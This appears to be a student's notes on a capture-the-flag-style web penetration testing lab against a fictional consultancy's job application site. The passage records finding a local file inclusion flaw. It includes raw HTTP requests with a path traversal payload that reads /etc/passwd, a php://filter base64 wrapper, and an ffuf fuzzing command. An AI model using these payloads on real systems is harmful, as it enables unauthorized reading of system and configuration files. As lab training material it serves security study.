
## Scenario

You have been contracted by `Sumace Consulting Gmbh` to carry out a web application penetration test against their main website. During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.

![Sumace logo, Trusted IT consultants since 1998, services: Identity Access Management, Penetration Testing, ISO27001 Compliance. 'We can do it.' Contact Us button.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/sa/1.png)

Q1. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

```
step 1 

find the parameter for LFI 

##in the scenario its stated that we have to test the newly created job application form.

3 possible end points.

	http://154.57.164.82:32216/thanks.php?n=sdfgdfg

		this just loads whatever in this "n=" as name

```

```
	GET /api/image.php?p= HTTP/1.1
Host: 154.57.164.82:32216
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://154.57.164.82:32216/apply.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=e3jjh4tqcd4loen8lo9rq79fkc; cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
Connection: keep-alive
	
	
	this endpoint loads the image file..
```


where is the file uploading to ?


```
GET /api/image.php?p=....//....//....//....//etc/passwd HTTP/1.1
Host: 154.57.164.82:32216
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://154.57.164.82:32216/thanks.php?n=php://filter/read=convert.base64-encode/resource=config
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=e3jjh4tqcd4loen8lo9rq79fkc; cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
Connection: keep-alive


yes this was the LFI vuln parameter as it was reading a file an image.

we found it out using the 

ffuf -w <PATH>/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u http://<IP>:<PORT>/api/image.php?p=FUZZ -fs 0

i tried many payloads that didnt work so yeah this works.


```